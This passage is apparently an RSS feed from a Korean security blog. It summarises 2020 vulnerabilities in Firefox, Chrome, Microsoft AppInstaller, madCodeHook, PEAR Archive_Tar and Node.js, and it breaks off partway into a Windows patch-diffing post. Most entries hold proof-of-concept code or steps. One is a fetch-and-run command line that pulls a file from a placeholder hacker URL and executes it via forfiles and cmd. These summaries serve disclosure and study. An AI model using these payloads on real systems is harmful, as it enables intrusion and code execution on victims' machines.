      <comments>https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-15680 : protocol handler infomation disclosure</title>
      <link>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/</link>
      <guid>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/</guid>
      <pubDate>Sat, 05 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/leaking-bro</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.fortinet.com/blog/threat-research/leaking-browser-url-protocol-handlers?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+fortinet/blog/threat-research+(Fortinet+Threat+Research+Blog)">leaking browser url/protocol handler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firebox 78.01</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox에서 Protocol Handler를 이용한 Information Disclosure 취약점이 발견되었습니다. Protocol Handler는 응용 프로그램이 자신의 URI scheme를 등록할 수 있는 매커니즘으로 이를 통해 프로세스를 실행할 수 있습니다. 브라우저가 Protocol Handler URI를 사용해 프로세스를 실행하면 “웹사이트에서 이 애플리케이션을 열려고 합니다.”라는 알림이 뜹니다.  </p><p>Firefox가 이미지 태그의 소스를 렌더링 할 때, Protocol Handler의 존재 여부에 따라 렌더링 결과가 다릅니다. 해커는 이점을 악용해 원격으로 victim에 설치된 프로그램 리스트를 알 수 있습니다.</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>victim에 존재하는 Protocol Handler를 이미지 src에 넣으면 broken image에 대한 기본 설정에 따라 Element의 size가 24x24로 렌더링 됩니다.</p><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;존재하지않는ProtocolHandler://abc&quot;</span>&gt;</span></code></pre><p>반면, 존재하지 않는 Protocol Handler를 이미지 src에 넣으면 Element의 size는 0x0으로 설정됩니다.</p><p>따라서 해커는 간단한 JS script로 Element의 width를 검사해 Protocol Handler의 존재 여부를 확인하는 brute force 공격을 할 수 있습니다.</p><pre><code class="hljs javascript">known_handlers = [  ...]  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = knwon_handers.length <span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i--)&#123;  handler_id = <span class="hljs-string">&#x27;handler_&#x27;</span> + i  $(<span class="hljs-string">&#x27;body&#x27;</span>).append(<span class="hljs-string">&#x27;&lt;img id =&quot;&#x27;</span> + handler_id + <span class="hljs-string">&#x27;&quot;src=&quot;&#x27;</span>+known_handers[i]  + <span class="hljs-string">&#x27;://192.168.133.142/&quot;&gt;&lt;/img&gt;&#x27;</span>)  <span class="hljs-keyword">if</span>($(<span class="hljs-string">&#x27;#&#x27;</span> + handler_id).css(<span class="hljs-string">&#x27;width&#x27;</span>) == <span class="hljs-string">&quot;24px&quot;</span>)&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Handler &#x27;</span> + known_handlers[i] + <span class="hljs-string">&#x27;Exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;  <span class="hljs-keyword">else</span>&#123;    $(<span class="hljs-string">&#x27;&lt;p&gt;Hander &#x27;</span> + known_handers[i] + <span class="hljs-string">&#x27;Does not exists&lt;/p&gt;&#x27;</span>).appendTo(<span class="hljs-string">&#x27;#logbox&#x27;</span>);  &#125;    $(<span class="hljs-string">&#x27;#&#x27;</span> + hander_id).remove()&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/05/fabu1ous/2020-12-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Chrome UAF in StopProfiler</title>
      <link>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/</link>
      <guid>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/</guid>
      <pubDate>Fri, 04 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=111</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1119865">Chrome UAF in StopProfiler</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Chrome (Operating System: all)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CPU 등의 리소스 사용량을 모니터링할 수 있는 <code>profiler</code> 객체에서 비동기 처리 키워드를 사용한 UAF 취약점이 발견되었습니다. </p><p>해당 취약점의 POC는 다음과 같습니다.</p><pre><code class="hljs jsx">&lt;html&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;script&gt;        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>) </span>&#123;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; ++i) &#123;                <span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();            &#125;        &#125;        <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>)</span>&#123;            <span class="hljs-keyword">var</span> pf = <span class="hljs-keyword">await</span> performance.profile(&#123; <span class="hljs-attr">sampleInterval</span>: <span class="hljs-number">10</span> &#125;);            <span class="hljs-built_in">console</span>.log(pf);            cnt = <span class="hljs-number">0</span>;            <span class="hljs-built_in">Object</span>.prototype.__defineGetter__(<span class="hljs-string">&quot;then&quot;</span>, <span class="hljs-function">()=&gt;</span>&#123;                <span class="hljs-keyword">if</span>( cnt == <span class="hljs-number">0</span>)&#123;                    cnt ++;                    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;hello&quot;</span>);                    pf.stop();                    gc();                &#125;            &#125;)            pf.stop();        &#125;        main();    &lt;/script&gt;&lt;/html&gt;</code></pre><pre><code class="hljs jsx"><span class="hljs-keyword">void</span> ProfilerGroup::StopProfiler(ScriptState* script_state,                                 Profiler* profiler,                                 ScriptPromiseResolver* resolver) &#123;...  auto* trace = ProfilerTraceBuilder::FromProfile(      script_state, profile, profiler-&gt;SourceOrigin(), profiler-&gt;TimeOrigin());  resolver-&gt;Resolve(trace);  <span class="hljs-keyword">if</span> (profile)    profile-&gt;Delete();  profilers_.erase(profiler);...</code></pre><p><code>ProfilerGroup::StopProfiler</code> 함수의 resolve는 사용자 정의 함수를 호출할 수 있습니다. </p><p>비동기 함수로 선언한 <code>main</code> 함수에서 <code>await</code> 키워드로 <code>performance.profile</code> 객체를 선언하고 <code>Object.prototype.__defineGetter__</code> 의 사용자 정의 함수와 main에서 <code>stop</code> 을 두 번 호출하게 되면  <code>CpuProfile</code> 객체가 삭제됩니다. 결과적으로 <code>CpuProfile</code> 에서 UAF 취약점을 트리거할 수 있습니다.</p><p>이는 간단하지만 높은 심각성의 UAF 취약점으로, Google은 <code>Profiler::stop</code> 에서 동기 스크립트 실행을 방지하도록 패치했습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://chromium-review.googlesource.com/c/chromium/src/+/2373184">https://chromium-review.googlesource.com/c/chromium/src/+/2373184</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
      
      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/asynchronous/">asynchronous</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/04/l0ch/2020-12-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Microsoft AppInstaller.exe Arbitrary File Download</title>
      <link>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/</link>
      <guid>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/</guid>
      <pubDate>Thu, 03 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/notwhickey/status/1333900137232523264</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/notwhickey/status/1333900137232523264">https://twitter.com/notwhickey/status/1333900137232523264</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft AppInstaller</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft App Installer에서 arbitrary file download를 하여 lolbin(<a href="https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/">living of the land binary</a>)으로 활용할 수 있는 방법이 발견되었습니다.</p><p>웹 서버에서 앱 패키지를 다운로드할 때 과정을 간소화하여 효율적으로 하기 위해 웹 서버에서 직접 앱을 설치할 수 있는 기능을 제공합니다. 웹 페이지에서 앱 패키지를 호스팅 하기 위해서 <code>ms-appinstaller:?source=</code> URI를 사용하여 <code>source=</code>에 명시된 주소에 있는 파일에 대한 앱 다운로드를 진행합니다. 이를 악용하여 해커는 자신의 악성 파일을 source에 작성하여 arbitrary file download을 진행할 수 있고 <code>forfiles</code> 명령어를 통해 앱 패키지 다운로드가 진행된 경로에서 파일을 조건문 등으로 검색하여 실행이 가능합니다.</p><pre><code class="hljs taggerscript">start ms-appinstaller://?source=&lt;hacker-url&gt; &amp;&amp; timeout &lt;sleep-time&gt; &amp;&amp; taskkill /F /IM AppInstaller.exe &gt; NULforfiles /P &quot;C:<span class="hljs-symbol">\\</span>Users<span class="hljs-symbol">\\</span><span class="hljs-variable">%username%</span><span class="hljs-symbol">\\</span>AppData<span class="hljs-symbol">\\</span>Local<span class="hljs-symbol">\\</span>Packages<span class="hljs-symbol">\\</span>Microsoft.DesktopAppInstaller_8wekyb3d8bbwe<span class="hljs-symbol">\\</span>AC<span class="hljs-symbol">\\</span>INetCache&quot; /S /M * /C &quot;cmd /c if @fsize==&lt;file-size&gt; FOR /F <span class="hljs-symbol">\\</span>&quot;tokens=*<span class="hljs-symbol">\\</span>&quot; <span class="hljs-variable">%g IN (&#x27;type @path&#x27;) do (%</span>g);&quot; &gt; NUL</code></pre><p><img src="/2020/12/03/idioth/2020-12-03/image.png"></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
      
      <category domain="https://hackyboiz.github.io/tags/appinstaller/">appinstaller</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-download/">arbitrary file download</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/03/idioth/2020-12-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-14418 : madCodeHook library LPE</title>
      <link>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/</link>
      <guid>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/</guid>
      <pubDate>Wed, 02 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.nettitude.com/blog/cve-2020-14418-madcodehoo</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.nettitude.com/blog/cve-2020-14418-madcodehook-library-local-privilege-escalation/">CVE-2020-14418</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>All software using MadCodeHook &lt;= v4.1.3</p><ul><li>Cisco AMP &lt;= v7.2.13</li><li>Morphisec Unified Threat Prevention Platform &lt;= v4.1.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>madCodeHook은 다양한 API hooking 기능을 지원하는 third party 라이브러리입니다. madCodeHook라이브러리에 포함된 <code>ExprevDriver.sys</code>라는 드라이버는 유저 모드 프로세스에 <code>Protector32.dll</code> 혹은 <code>Protector64.dll</code>을 삽입해 그 프로세스를 보호 및 감시할 수 있습니다. DLL injection 공격을 방지하는 기능과 프로세스 모니터링 기능을 제공하므로 몇몇 보안 제품에서 madCodeHook 라이브러리를 사용합니다.</p><p>아이러니하게도 DLL injection을 방지하기 위해 사용되는 <code>ExprevDriver.sys</code> 드라이버에 path redirection을 이용한 toctou 취약점이 존재하고, 해커는 이를 악용해 DLL injection을 할 수 있습니다.</p><ol><li><p>실제  <code>Protector64.dll</code>이 존재하는 디렉터리를 가리키는 juction을 생성합니다.</p><pre><code class="hljs powershell">“mklink /J C:\users\&lt;username&gt;\Desktop\exprev C:\Program Files\Cisco\AMP\exprev”</code></pre></li><li><p><code>ExprevDriver.sys</code>에 IOCTL을 넘겨줍니다.</p><pre><code class="hljs latex">“C:<span class="hljs-tag">\<span class="hljs-name">users</span></span><span class="hljs-tag">\<span class="hljs-name">&lt;</span></span>username&gt;<span class="hljs-tag">\<span class="hljs-name">Desktop</span></span><span class="hljs-tag">\<span class="hljs-name">exprev</span></span><span class="hljs-tag">\<span class="hljs-name">Protector</span></span>64.dll”</code></pre><p>IOCTL을 사용해  <code>ExprevDriver.sys</code>가 삽입할 DLL의 경로와 대상 프로세스를 지정할 수 있습니다.  <code>ExprevDriver.sys</code>는 DLL을 삽입하기 전에 DLL의 전자서명을 검증하는 단계를 거치는데,  IOCTL로 설정된 경로를 사용합니다. Protector64.dll의 경로를 1번에서 만들어 둔 juction으로 설정해줍니다.</p></li><li><p>디렉터리 juction을 삭제하고 가짜 <code>Protector64.dll</code>을 생성합니다.</p><p>DLL의 전자서명 검증 이후 juction을 삭제하고 2번 단계에서 지정해준 경로에 <code>Protector64.dll</code>라는 이름의 악성 DLL을 생성합니다.</p></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/02/fabu1ous/2020-12-02/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-28948/28949 : Multiple vulnerabilities through filename manipulation</title>
      <link>https://hackyboiz.github.io/2020/12/01/l0ch/2020-12-01/</link>
      <guid>https://hackyboiz.github.io/2020/12/01/l0ch/2020-12-01/</guid>
      <pubDate>Tue, 01 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/pear/Archive_Tar/issues/33&quot;&gt;Archive_Ta</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/pear/Archive_Tar/issues/33">Archive_Tar Issue - multiple vulnerabilities through filename manipulation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>PEAR Archive_Tar</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PEAR Archive_Tar는 PHP에서 TAR 파일을 처리하는 데 사용하는 오픈소스 라이브러리입니다. 해당 라이브러리에서 phar unseirialization과 arbitrary file overwrite 두 가지 취약점이 발견되었습니다.</p><br>첫 번째 취약점(CVE-2020-28948)은 scheme 필터링 우회를 통한 unserialization 취약점입니다.<p>Archive_Tar에는 unserialization 공격을 방지하기 위해 다음과 같은 코드가 존재합니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;phar://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>그러나 <code>PHAR://malicious_file.phar</code> 과 같이 대문자로 작성하면 해당 코드를 우회해 unserialization을 통한 obejct injection이 가능합니다.<br><br></p><p>두 번째 취약점(CVE-2020-28949)은 Archive_Tar에서 stream wrapper를 체크하지 않아 발생하는 arbitrary file overwrite 취약점입니다. 이 취약점 또한 CVE-2020-28948과 같은 코드에서 발생한 취약점으로, <code>file://</code> scheme에 대한 검사를 하지 않아 해커가 임의 파일을 덮어쓸 수 있습니다. php가 루트 권한으로 실행되었다면 <code>/etc/passwd</code> 파일을 포함한 시스템 파일 또한 덮어쓸 수 있습니다.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;://&#x27;</span>) === <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&#x27;..\\\\&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>이 두 취약점은 문자열에 <code>phar://</code> 가 아닌 <code>://</code> 가 포함될 경우 이를 필터링하는 방식으로 패치되었습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/unserialization/">unserialization</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-overwrite/">arbitrary file overwrite</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/01/l0ch/2020-12-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
      <link>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/</link>
      <guid>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/</guid>
      <pubDate>Mon, 30 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://livingbeef.blogspot.com/2020/11/cve-2020-8277-ana</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js에서 OOB(Out of Bounds) Read를 통해 Denial of Service를 트리거할 수 있는 취약점이 발견되었습니다. 해당 취약점은 많은 양의 DNS record를 <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares 라이브러리</a>에서 TTL record를 parsing 할 때 배열 길이의 계산을 잘못하면서 일어나는 취약점입니다.</p><p>c-ares 라이브러리의 <code>ares_parse_aaaa_reply</code> 함수는 response를 포함하는 <code>char* abuffer</code>, response의 길이인 <code>alen</code>, DNS response가 반환될 구조체 포인터 <code>host</code>, TTL 배열인 <code>addrttls / naddrttls</code>를 인자로 갖습니다. <code>addrttls</code>는 반환된 TTL의 주소로 채워지는 배열이고, <code>naddrttls</code>는 반환할 TTL의 최대 값입니다. response의 reply 개수가 <code>addrttls</code> 배열보다 클 경우  <code>naddrttls</code>에서 확인 후 256개의 TTL만 처리되고 나머지 부분은 잘리게 됩니다. 하지만 취약점은 TTL의 개수에 대한 잘못된 처리가 아니라 response의 reply 개수를 잘못 계산하는 것에서 일어납니다.</p><ol><li>reply의 개수를 새서 <code>naddrs</code>에 저장</li><li>TTL 배열 작성(<code>naddrttls</code>에 의해 잘린 <code>addrttls</code>)</li><li><code>naddrttls</code> 재작성 - 실제 TTL 배열에 작성된 값보다 큰 지 확인하지 않고 <code>naddrs</code>를 집어넣음</li></ol><p>따라서 반환된 <code>naddrttls</code>가 작성된 reply의 TTL 개수보다 커지므로 OOB read가 가능하고 이를 악용하여 Denial of Service 공격을 트리거할 수 있습니다.</p><p>해당 취약점은 <code>naddrttls</code>에 <code>naddrs</code> 값을 넣을 때 <code>naddrs</code>의 값이 <code>naddrttls</code>보다 클 경우 <code>naddrttls</code> 값을 넣는 것으로 패치되었습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls)&#123;*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;&#125;</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
      
      <category domain="https://hackyboiz.github.io/tags/node-js/">node.js</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob-read/">oob read</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/30/idioth/2020-11-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
      <link>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/</link>
      <guid>https://hackyboiz.github.io/2020/11/29/l0ch/windows-patch-diffing-part2/</guid>
      <pubDate>Sun, 29 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2020/11/15/l</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요 여러분! L0ch입니다. 지난 Windows Patch Diffing글의 분량 조절 실패로 파트 1에 이어 파트 2로 돌아왔습니다! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing 맛보기 Part 1</a></p><p>업데이트 패키지 추출도 했으니 이제 진짜 패치 diffing을 시작…하기 전에! 해야 할게 한 가지 더 남아있습니다.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png"></p><blockquote><p>아니 그럼 diffing은 대체 언제 함?</p></blockquote><p>윈도우에서 패치를 할 때 어떤 방식으로 하는지를 먼저 알아봐야 합니다. 그래야 diffing 할 버전 별 바이너리를 생성할 수 있어요 ㅎㅎ</p><h1 id="패치-파일-유형"><a href="#패치-파일-유형" class="headerlink" title="패치 파일 유형"></a>패치 파일 유형</h1><p>이전 글에서 추출한 null, forward, reverse differential에 대해 간단하게 살펴봤었죠. 이 diff 유형의 파일들은 diffing 할 버전별 바이너리를 생성하는 데 아래와 같은 역할을 합니다.</p><ul><li><p>Forward diff</p><ul><li>기본 바이너리 (.1)를 특정 패치 수준까지 가져옵니다.</li></ul></li><li><p>Reverse diff</p><ul><li>패치가 적용된 바이너리를 기본 바이너리 (.1)로 롤백합니다.</li></ul></li><li><p>NULL diff</p><ul><li><p>패치에서 새 파일이 추가될 경우 사용됩니다.</p></br></li></ul></li></ul><p>diff 파일을 이용한 Windows의 패치 과정입니다. </p><ol><li>기존 바이너리 버전에 맞는 reverse diff 파일로 델타 패치해 기본 버전으로 롤백</li><li>패치 패키지에서 추출한 forward diff 파일로 델타 패치</li></ol><ul><li><p>NULL diff일 경우 패치할 경로에 복사</p></br></li></ul><p>우리가 diffing 할 바이너리를 구하는 과정은 다음과 같습니다.</p><ol><li><code>C:\system32\WinSxS</code> 에서 diffing 할 바이너리를 찾습니다. WinSxS에는 diff 파일뿐만 아니라 해당 버전의 바이너리도 함께 들어있습니다.</li><li>해당 버전의 reverse diff로 델타 패치해 기본 버전 바이너리로 롤백합니다.</li><li>추출한 패치 파일에서 패치할 버전의 forward diff로 델타 패치를 합니다.</li><li>패치된 바이너리의 hash를 구하고 manifest hash와 비교해 정상적으로 패치되었는지 확인합니다.</li></ol><h1 id="패치-적용"><a href="#패치-적용" class="headerlink" title="패치 적용"></a>패치 적용</h1><p><code>ntoskrnl.exe</code> 의 버전 별 바이너리를 생성해서 diffing 해보도록 하겠습니다!</p><p>diffing 대상 선정은 취약점 정보와 해당 취약점의 패치 릴리즈 버전을 보고 판단하면 되겠습니다.</p><p>powershell에서 다음 명령어를 입력하면 WinSxS에 업데이트된 버전별 differential 파일들을 확인할 수 있습니다.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? &#123;$_.Name -eq &quot;ntoskrnl.exe&quot;&#125;</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png"></p><p>환경마다 누적된 업데이트가 달라서 결과는 다를 수 있습니다.  현재 제 윈도우 시스템의 <code>ntoskrnl.exe</code> 버전인 10.0.18362.1082를 기준으로 진행해 볼게요.</p><p>현재 ntoskrnl.exe 버전 - 10.0.18362.1082</p><p>추출한 ntoskrnl.exe 버전 - 10.0.18362.1016</p><p>1082 버전은 제 시스템에 이미 있으니 1016 버전을 델타 패치로 생성해보겠습니다!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff 패치에는 ms에서 지원하는 patch API인 <code>msdelta.dll</code> 를 사용합니다.</p><p>Vista 이상 Windows에서는 <code>msdelta.dll</code> 이 기본적으로 내장되어 있기 때문에 가져다가 쓰기만 하면 되죠 ㅎㅎ</p><p>아래는 파이썬을 사용해 작성한 msdelta 패치 스크립트입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span 